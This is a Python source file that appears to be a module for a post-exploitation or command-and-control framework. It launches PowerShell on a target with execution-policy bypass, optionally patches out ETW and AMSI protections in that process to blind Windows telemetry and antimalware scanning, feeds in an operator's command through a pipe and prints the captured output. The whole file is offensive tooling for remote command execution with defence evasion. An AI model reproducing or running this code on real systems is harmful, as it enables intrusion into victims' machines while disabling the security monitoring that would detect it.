import eternalhush as eh
from additional.clingyspider import api
from additional.clingyspider import const
import os
import base64
import time

def main(args):
    encoded_cmd = base64.b64encode(args.cmd.encode("utf-16-le")).decode("utf-8")
    retn = api.CreateProcess("powershell.exe", "-nop -exec bypass -nologo", 0)
    if not retn:
        eh.ui.Echo("Failed to create remote process 'powershell.exe {}'".format("-nop -exec bypass -nologo"), eh.ECHO_ERROR)
        return
    read_handle = int(retn.hread)
    write_handle = int(retn.hwrite)
    process_handle = int(retn.hprocess)   
    thread_handle = int(retn.hthread)

    eh.ui.Echo("Created remote process 'powershell.exe {}'".format("-nop -exec bypass -nologo"), eh.ECHO_GOOD)

    if args.noetw:
        eh.ui.Run("!patchtool -use_handle {} -protection etw -action patch".format(process_handle), eh.RUN_SILENT)
    if args.noamsi:
        eh.ui.Run("!patchtool -use_handle {} -protection amsi -action patch".format(process_handle), eh.RUN_SILENT)

    api.WriteFile(write_handle, args.cmd.encode() + b"\n")
    if args.timeout:
        eh.ui.Echo("Specified timeout " + str(args.timeout) + "s", eh.ECHO_WARNING)
        time.sleep(args.timeout)
    else:
        time.sleep(5)
    
    eh.ui.Echo("============CAPTURED OUTPUT=================", eh.ECHO_DEFAULT)
    eh.ui.Echo("", eh.ECHO_DEFAULT)
    
    text = api.ReadFile(read_handle).decode("cp866", errors="replace")
    if text == None:
        eh.ui.Echo(f"Failed to read from remote pipe")
        return
    first_s = text.split(">")[0] + ">"
    text_array = text.split("\n")
    new_text = ""
    for s in text_array:
        if not s.startswith(first_s):
            new_text += s+"\n"

    eh.ui.Echo(new_text, eh.ECHO_DEFAULT)
    
    api.TerminateProcess(process_handle, 0)

    api.CloseFile(write_handle)
    api.CloseFile(read_handle)
    api.CloseFile(thread_handle)
    api.CloseFile(process_handle)
    


